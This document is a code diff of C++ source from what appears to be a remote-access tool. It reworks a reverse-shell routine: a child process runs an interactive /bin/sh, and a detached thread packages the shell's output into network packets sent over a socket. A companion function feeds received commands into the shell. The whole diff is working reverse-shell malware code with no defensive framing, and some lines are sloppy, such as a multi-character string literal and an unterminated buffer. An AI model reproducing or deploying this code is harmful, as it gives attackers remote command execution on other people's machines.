@@ -1,10 +1,15 @@
+#include "remote_accsess/ReverseShell.h"
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
 #include <cstring>
 #include <cstdlib>
-#include "remote_accsess/ReverseShell.h"
+#include <string>
+#include <iostream>
+#include <thread>
+#include "protocol/Packet.h"
+#include "protocol/PacketData.h"
 
 #define BUFFER_SIZE 1024
 
@@ -43,11 +48,8 @@ int isDataAvailable(int fd) {
     return select(fd + 1, &readSet, NULL, NULL, &timeout) > 0;
 }
 
-void startRSHSessionPipe(int sockFD) {
-
-    int toShellPipe[2];
-    int fromShellPipe[2];
-
+pid_t startRSHSessionPipe(int sockfd, struct sockaddr_in *src, struct sockaddr_in *dst, int *toShellPipe,
+                          int *fromShellPipe) {
     if (pipe(toShellPipe) == -1 || pipe(fromShellPipe) == -1) {
         perror("pipe");
         exit(EXIT_FAILURE);
@@ -70,7 +72,7 @@ void startRSHSessionPipe(int sockFD) {
 
         close(toShellPipe[0]);
         close(fromShellPipe[1]);
-        close(sockFD);
+
 
         execl("/bin/sh", "sh", "-i", NULL);
         perror("execl");
@@ -78,49 +80,36 @@ void startRSHSessionPipe(int sockFD) {
     } else {
         close(toShellPipe[0]);
         close(fromShellPipe[1]);
+        std::thread thread([sockfd, src, dst, child_pid, fromShellPipe]() {
+            char buffer[BUFFER_SIZE];
 
-        char buffer[BUFFER_SIZE];
-        ssize_t bytesRead;
+            while (waitpid(child_pid, NULL, WNOHANG) == 0) {
+                if (isDataAvailable(fromShellPipe[0])) {
+                    size_t byte = read(fromShellPipe[0], buffer, BUFFER_SIZE);
+                    std::cout << buffer << ' output \n';
+                    CommandData commandData((std::string(buffer)));
+                    Packet packet(RSH_COMMAND, src, dst, commandData);
+                    sendPacket(sockfd, packet);
 
-        while (waitpid(child_pid, NULL, WNOHANG) == 0) {
-            if (isDataAvailable(sockFD)) {
-                bytesRead = read(sockFD, buffer, BUFFER_SIZE);
-                if (write(toShellPipe[1], buffer, bytesRead) == -1) {
-                    perror("write");
+
                 }
             }
+        });
+        thread.detach();
 
-            if (isDataAvailable(fromShellPipe[0])) {
-                bytesRead = read(fromShellPipe[0], buffer, BUFFER_SIZE);
-                if (write(sockFD, buffer, bytesRead) == -1) {
-                    perror("write");
-                    break;
-                }
-            }
-        }
-
-        close(fromShellPipe[0]);
-        close(toShellPipe[1]);
+        return child_pid;
     }
 }
 
 
-void recvRSHSSession(int sockFD) {
-    printf("Entering RSH recv mod! (enter '!q' to quit)\n");
-
-
-    char buffer[1024];
-    recv(sockFD, buffer, 1024, 0);
-    while (1) {
-        ssize_t received_bytes = recv(sockFD, buffer, 1024, 0);
-        if (received_bytes <= 0) {
-            break;
-        }
-        buffer[received_bytes] = '\0';
-        printf("%s", buffer);
-
-        fgets(buffer, 1024, stdin);
-        if (strcmp(buffer, "!q") == 0) break;
-        send(sockFD, buffer, strlen(buffer), 0);
+void sendRSHCommand(std::string command, int *toShellPipe) {
+    if (write((toShellPipe[1]), command.c_str(), command.size()) == -1) {
+        perror("write");
+    } else {
+        std::cout << "write " << command << '\n';
     }
-};
+
+}
+
+
+
